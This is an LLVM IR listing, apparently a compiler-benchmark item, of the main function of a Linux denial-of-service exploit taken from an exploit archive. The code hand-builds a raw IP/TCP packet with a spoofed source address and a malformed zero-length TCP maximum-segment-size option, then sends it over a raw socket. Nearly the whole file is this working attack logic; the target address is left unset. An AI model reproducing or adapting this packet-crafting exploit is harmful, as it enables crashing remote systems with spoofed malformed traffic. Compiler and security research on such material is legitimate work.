; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_25046.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_25046.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_5__, i32 }
%struct.TYPE_5__ = type { i8* }
%struct.ip = type { i32, i32, i32, i32, %struct.TYPE_6__, %struct.TYPE_4__, i64, i32, i64, i64, i64 }
%struct.TYPE_6__ = type { i8* }
%struct.TYPE_4__ = type { i8* }
%struct.tcphdr = type { i32, i32, i64, i64, i64, i64, i64, i64, i8*, i8* }
%struct.sockaddr = type { i32 }

@__const.main.opts = private unnamed_addr constant [5 x i8] c"\02\00\FF\FF\00", align 1
@DADDR = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"1.2.3.4\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"sendto\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"packet sent!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [5 x i8], align 1
  %8 = alloca [64 x i8], align 16
  %9 = alloca %struct.sockaddr_in, align 8
  %10 = alloca %struct.ip*, align 8
  %11 = alloca %struct.tcphdr*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [5 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.opts, i32 0, i32 0), i64 5, i1 false)
  %13 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %14 = bitcast i8* %13 to %struct.ip*
  store %struct.ip* %14, %struct.ip** %10, align 8
  %15 = bitcast [64 x i8]* %8 to i8**
  %16 = call i32 @memset(i8** %15, i32 0, i32 64)
  %17 = load i8*, i8** @DADDR, align 8
  %18 = call i8* @inet_addr(i8* %17)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %20 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %19, i32 0, i32 0
  store i8* %18, i8** %20, align 8
  %21 = call i8* @htons(i32 123)
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i8* %21, i8** %22, align 8
  %23 = load i32, i32* @AF_INET, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %23, i32* %24, align 8
  %25 = load %struct.ip*, %struct.ip** %10, align 8
  %26 = getelementptr inbounds %struct.ip, %struct.ip* %25, i32 0, i32 0
  store i32 5, i32* %26, align 8
  %27 = load %struct.ip*, %struct.ip** %10, align 8
  %28 = getelementptr inbounds %struct.ip, %struct.ip* %27, i32 0, i32 1
  store i32 4, i32* %28, align 4
  %29 = load %struct.ip*, %struct.ip** %10, align 8
  %30 = getelementptr inbounds %struct.ip, %struct.ip* %29, i32 0, i32 10
  store i64 0, i64* %30, align 8
  %31 = load %struct.ip*, %struct.ip** %10, align 8
  %32 = getelementptr inbounds %struct.ip, %struct.ip* %31, i32 0, i32 9
  store i64 0, i64* %32, align 8
  %33 = load %struct.ip*, %struct.ip** %10, align 8
  %34 = getelementptr inbounds %struct.ip, %struct.ip* %33, i32 0, i32 8
  store i64 0, i64* %34, align 8
  %35 = load %struct.ip*, %struct.ip** %10, align 8
  %36 = getelementptr inbounds %struct.ip, %struct.ip* %35, i32 0, i32 2
  store i32 64, i32* %36, align 8
  %37 = load i32, i32* @IPPROTO_TCP, align 4
  %38 = load %struct.ip*, %struct.ip** %10, align 8
  %39 = getelementptr inbounds %struct.ip, %struct.ip* %38, i32 0, i32 7
  store i32 %37, i32* %39, align 8
  %40 = load %struct.ip*, %struct.ip** %10, align 8
  %41 = getelementptr inbounds %struct.ip, %struct.ip* %40, i32 0, i32 3
  store i32 44, i32* %41, align 4
  %42 = load %struct.ip*, %struct.ip** %10, align 8
  %43 = getelementptr inbounds %struct.ip, %struct.ip* %42, i32 0, i32 6
  store i64 0, i64* %43, align 8
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %45 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %44, i32 0, i32 0
  %46 = load i8*, i8** %45, align 8
  %47 = load %struct.ip*, %struct.ip** %10, align 8
  %48 = getelementptr inbounds %struct.ip, %struct.ip* %47, i32 0, i32 5
  %49 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %48, i32 0, i32 0
  store i8* %46, i8** %49, align 8
  %50 = call i8* @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %51 = load %struct.ip*, %struct.ip** %10, align 8
  %52 = getelementptr inbounds %struct.ip, %struct.ip* %51, i32 0, i32 4
  %53 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %52, i32 0, i32 0
  store i8* %50, i8** %53, align 8
  %54 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %55 = load %struct.ip*, %struct.ip** %10, align 8
  %56 = getelementptr inbounds %struct.ip, %struct.ip* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 8
  %58 = shl i32 %57, 2
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %54, i64 %59
  %61 = bitcast i8* %60 to %struct.tcphdr*
  store %struct.tcphdr* %61, %struct.tcphdr** %11, align 8
  %62 = call i8* @htons(i32 321)
  %63 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %64 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %63, i32 0, i32 9
  store i8* %62, i8** %64, align 8
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %66 = load i8*, i8** %65, align 8
  %67 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %68 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %67, i32 0, i32 8
  store i8* %66, i8** %68, align 8
  %69 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %70 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %69, i32 0, i32 7
  store i64 0, i64* %70, align 8
  %71 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %72 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %71, i32 0, i32 6
  store i64 0, i64* %72, align 8
  %73 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %74 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %73, i32 0, i32 5
  store i64 0, i64* %74, align 8
  %75 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %76 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %75, i32 0, i32 0
  store i32 6, i32* %76, align 8
  %77 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %78 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %77, i32 0, i32 4
  store i64 0, i64* %78, align 8
  %79 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %80 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %79, i32 0, i32 1
  store i32 4096, i32* %80, align 4
  %81 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %82 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %81, i32 0, i32 3
  store i64 0, i64* %82, align 8
  %83 = load %struct.tcphdr*, %struct.tcphdr** %11, align 8
  %84 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %83, i32 0, i32 2
  store i64 0, i64* %84, align 8
  %85 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %86 = getelementptr inbounds i8, i8* %85, i64 40
  %87 = getelementptr inbounds [5 x i8], [5 x i8]* %7, i64 0, i64 0
  %88 = call i32 @memcpy(i8* %86, i8* %87, i32 5)
  %89 = load i32, i32* @PF_INET, align 4
  %90 = load i32, i32* @SOCK_RAW, align 4
  %91 = load i32, i32* @IPPROTO_RAW, align 4
  %92 = call i32 @socket(i32 %89, i32 %90, i32 %91)
  store i32 %92, i32* %6, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %97

94:                                               ; preds = %2
  %95 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %96 = call i32 @exit(i32 0) #4
  unreachable

97:                                               ; preds = %2
  %98 = load i32, i32* %6, align 4
  %99 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %100 = load %struct.ip*, %struct.ip** %10, align 8
  %101 = getelementptr inbounds %struct.ip, %struct.ip* %100, i32 0, i32 3
  %102 = load i32, i32* %101, align 4
  %103 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %104 = call i32 @sendto(i32 %98, i8* %99, i32 %102, i32 0, %struct.sockaddr* %103, i32 24)
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

106:                                              ; preds = %97
  %107 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %108 = call i32 @exit(i32 -1) #4
  unreachable

109:                                              ; preds = %97
  %110 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %111 = load i32, i32* %6, align 4
  %112 = call i32 @close(i32 %111)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8**, i32, i32) #2

declare dso_local i8* @inet_addr(i8*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
